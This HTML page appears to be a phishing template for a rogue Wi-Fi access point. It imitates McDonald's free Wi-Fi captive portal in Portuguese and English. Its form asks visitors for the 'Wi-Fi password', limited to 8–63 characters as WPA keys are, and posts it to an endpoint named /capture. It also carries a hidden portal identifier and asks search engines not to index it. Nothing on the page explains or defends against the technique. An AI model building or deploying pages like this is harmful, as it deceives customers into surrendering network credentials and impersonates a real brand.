<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>McDonald's - Wi-Fi</title>
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html { font-size: 16px; }
body { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #DA291C; color: #27251F; padding: 16px; }
.card { background: #FFFFFF; border-radius: 12px; padding: 32px 28px; width: 100%; max-width: 400px; box-shadow: 0 4px 24px rgba(0,0,0,0.2); }
.logo { text-align: center; margin-bottom: 4px; font-size: 48px; font-weight: 900; color: #FFC72C; text-shadow: 2px 2px 0 #DA291C; }
.logo-text { text-align: center; margin-bottom: 24px; font-size: 18px; font-weight: 800; color: #DA291C; }
.subtitle { text-align: center; color: #555; font-size: 14px; margin-bottom: 28px; line-height: 1.5; }
.form-group { margin-bottom: 16px; }
label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #27251F; }
input[type="password"], input[type="email"], input[type="text"] { width: 100%; padding: 13px 16px; border: 1.5px solid #E0E0E0; border-radius: 8px; font-size: 15px; background: #FAFAFA; color: #27251F; outline: none; transition: border-color 0.2s; }
input:focus { border-color: #FFC72C; }
button[type="submit"] { width: 100%; padding: 14px; background: #FFC72C; color: #27251F; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 8px; transition: opacity 0.2s; }
button:hover { opacity: 0.92; }
.footer { text-align: center; margin-top: 20px; font-size: 11px; color: #888; }
input[type="hidden"] { display: none; }
@media (max-width: 480px) { .card { padding: 24px 18px; } .logo { font-size: 40px; } }
</style>
</head>
<body>
<div class="card">
  <div class="logo">M</div>
  <div class="logo-text">McDonald's</div>
  <p class="subtitle">Aproveite o Wi-Fi gratuito do McDonald's</p>
  <form action="/capture" method="POST" autocomplete="off">
    <input type="hidden" name="csrf_token" value="">
    <input type="hidden" name="portal_id" value="mcdonalds">
    <div class="form-group">
      <label for="password">Senha do Wi-Fi</label>
      <input type="password" name="password" id="password" placeholder="Digite a senha" required minlength="8" maxlength="63" autocomplete="new-password">
    </div>
    <button type="submit">Conectar</button>
  </form>
  <p class="footer">Wi-Fi para clientes. Bom apetite!</p>
</div>
<script>
(function(){
  var lang = navigator.language || 'pt-BR';
  if (lang.startsWith('en')) {
    document.querySelector('.subtitle').textContent = "Enjoy McDonald's free Wi-Fi";
    document.querySelector('button[type=submit]').textContent = 'Connect';
    document.querySelector('.footer').textContent = "Wi-Fi for customers. Enjoy your meal!";
    document.querySelector('label[for=password]').textContent = 'Wi-Fi Password';
  }
})();
</script>
</body>
</html>
